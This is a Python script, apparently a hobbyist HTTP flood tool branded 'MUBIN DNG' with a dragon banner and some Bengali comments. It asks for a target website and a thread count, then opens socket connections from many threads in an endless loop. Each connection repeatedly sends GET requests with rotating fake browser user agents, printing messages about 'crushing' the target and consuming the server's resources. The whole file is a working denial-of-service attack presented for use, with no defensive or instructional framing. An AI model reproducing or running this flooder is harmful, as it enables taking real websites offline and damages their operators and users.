import socket
import threading
import random
import os
import sys
import time
from urllib.parse import urlparse

# MUBIN DNG - ADVANCED DRAGON SHELL BANNER
def banner():
    os.system('clear')
    print("\033[1;31m") 
    print(r"""
             ___====-_  _-====___
       _--^^^#####//      \\#####^^^--_
    _-^##########// (    ) \\##########^-_
   -############//  |\^^/|  \\############-
 _/############//   (@::@)   \\############\_
/#############((     \\//     ))#############\
-###############\\    (oo)    //###############-
-#################\\  / VV \  //#################-
-##################\\/      \//##################-
     _ /|      / __ \  / __ \  / __ \  |\ _
    /  \|     / /  \ \/ /  \ \/ /  \ \ |/  \
   /    \    / /    \  /    \  /    \ \    \
    \    \  / /      \/      \/      \ \  /
     \    \/ /                        \ \/
      \    \/                          \/
       \____/        MUBIN DNG         \____/
    """)
    print("\033[1;37m" + "━" * 65)
    print("      [!] ADVANCED LAYER 7 METHOD: ACTIVATED [!]")
    print("      [+] TARGETING: HIGH-PERFORMANCE SERVERS")
    print("      [+] AUTHOR: MUBIN DNG | DRAGON MASTER")
    print("━" * 65 + "\033[0m")

# ফেক ইউজার এজেন্ট লিস্ট (রোটেশনের জন্য)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

banner()
target_url = input("\033[1;36m[#] Target Website (https://site.com): \033[0m")

try:
    parsed_url = urlparse(target_url)
    domain = parsed_url.netloc
    path = parsed_url.path if parsed_url.path else "/"
    ip = socket.gethostbyname(domain)
    port = 443 if parsed_url.scheme == "https" else 80
    print(f"\033[1;32m[+] TARGET IP: {ip} | HOST: {domain}\033[0m")
except:
    print("\033[1;31m[!] Invalid URL!\033[0m")
    sys.exit()

threads = int(input("\033[1;36m[#] Dragon Souls (Threads): \033[0m"))

def strike_l7():
    while True:
        try:
            # সকেট কানেকশন তৈরি
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            
            # অ্যাডভান্সড এইচটিটিপি রিকোয়েস্ট তৈরি
            ua = random.choice(user_agents)
            header = f"GET {path} HTTP/1.1\r\n"
            header += f"Host: {domain}\r\n"
            header += f"User-Agent: {ua}\r\n"
            header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            header += "Connection: keep-alive\r\n"
            header += "Cache-Control: no-cache\r\n\r\n"
            
            # বারবার রিকোয়েস্ট পাঠানো
            for _ in range(50):
                s.send(header.encode('ascii'))
            
            print(f"\033[1;31m[L7-FIRE] CRUSHING -> {domain}\033[0m")
            s.close()
        except:
            time.sleep(0.1)

# থ্রেড লঞ্চ করা
for _ in range(threads):
    th = threading.Thread(target=strike_l7)
    th.daemon = True
    th.start()

print(f"\n\033[1;32m[*] Attack Started! Dragon is consuming the server resources...\033[0m")

while True:
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        break